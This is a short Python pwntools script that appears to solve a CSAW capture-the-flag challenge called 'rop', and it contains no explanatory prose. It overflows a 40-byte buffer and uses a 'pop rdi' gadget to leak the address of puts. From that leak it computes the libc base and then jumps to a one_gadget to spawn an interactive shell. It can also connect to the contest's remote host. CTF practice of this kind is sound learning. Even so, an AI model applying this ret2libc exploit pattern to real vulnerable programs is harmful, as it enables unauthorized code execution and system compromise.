#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

pop_rdi_ret = 0x0000000000400683 #: pop rdi; ret;
ret = 0x000000000040048e #: ret;

context.binary = exe

env = dict(LD_PRELOAD="%s:%s" % (ld.path, libc.path))

def conn(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(exe.path, env=env, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("pwn.chal.csaw.io", 5016)
    else:
        return process(exe.path, env=env, *a, **kw)

gdbscript = f'''
b *main
continue
'''

p = conn()
p.recvline()

offset = 40

payload1 = b""
payload1 += b"A"*offset
payload1 += p64(pop_rdi_ret)
payload1 += p64(exe.got['puts'])
payload1 += p64(exe.plt['puts'])
payload1 += p64(exe.symbols['main'])
p.sendline(payload1)

leak = p.recvline()
puts_addr = int.from_bytes(leak.strip(), "little")
libc.address = puts_addr - libc.symbols['puts']

one_gadget = 0x4f3c2

payload2 = b""
payload2 += b"B"*offset
payload2 += p64(ret)
payload2 += p64(libc.address+one_gadget)
payload2 += p64(0)*100 # one gadget constraint

p.recvline()
p.sendline(payload2)


p.interactive()
